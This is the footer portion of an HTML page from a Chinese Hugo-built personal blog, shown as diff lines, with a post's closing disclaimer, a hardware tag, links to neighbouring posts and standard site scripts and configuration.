+      </span><svg class="cl-shortcut-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="64" height="64"><path d="M824.32 473.6c-15.36-2.56-25.6-15.36-25.6-30.72 0-112.64-71.68-217.6-179.2-250.88-148.48-46.08-289.28 38.4-332.8 166.4-2.56 10.24-12.8 17.92-23.04 20.48C143.36 401.92 51.2 509.44 51.2 637.44v2.56c0 115.2 97.28 204.8 209.92 204.8h524.8c102.4-2.56 184.32-84.48 184.32-186.88 2.56-89.6-61.44-163.84-145.92-184.32z m-273.92 225.28c-12.8 12.8-30.72 15.36-46.08 10.24H501.76c-5.12-2.56-10.24-5.12-15.36-10.24L366.08 578.56c-15.36-15.36-15.36-43.52 0-58.88 15.36-15.36 43.52-15.36 58.88 0l51.2 51.2V352.4608c0-23.04 17.92-40.96 40.96-40.96 23.04 0 40.96 17.92 40.96 40.96v218.4192l51.2-51.2c17.92-17.92 43.52-17.92 61.44 0 17.92 15.36 17.92 40.96 0 58.88l-120.32 120.32z" fill="#4FC089"></path></svg></span></a>
+<blockquote>
+<p>注：本文仅供参考，内容仅为虚构，代码以及使用方法切勿使用于非法用途！</p>
+</blockquote>
+<blockquote>
+<p>原创文章-<a href="https://mp.weixin.qq.com/s/pD31fhn00LQ4MWBmTHy1nQ"target="_blank" rel="external nofollow noopener noreferrer">原文链接</a></p>
+</blockquote></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-05-27 09:56:07">更新于 2023-05-27&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E7%89%A9%E7%90%86%E7%A1%AC%E4%BB%B6/" class="post-tag" title="标签 - 物理硬件">物理硬件</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/typora%E7%A0%B4%E8%A7%A3%E4%BD%BF%E7%94%A8/" class="post-nav-item" rel="prev" title="Markdown编辑器——Typora破解版"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Markdown编辑器——Typora破解版</a>
+      <a href="/posts/chromedriver%E5%AE%89%E8%A3%85/" class="post-nav-item" rel="next" title="Selenium——ChromeDriver安装">Selenium——ChromeDriver安装<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="https://www.scan.work/"target="_blank" rel="external nofollow noopener noreferrer">Scan</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://gohugo.io/" target="_blank">由 Hugo 强力驱动</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中……'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="ms-1 d-none">Running</span><span class="run-times ms-1">网站运行中……</span></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/js/flyfish.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":100},"comment":{"enable":false},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"siteTime":"2023-05-19T19:30:34+08:00","twemoji":true,"version":"v0.3.7"};</script><script src="/js/theme.min.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@2.1.3/dist/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script></body>
+</html>
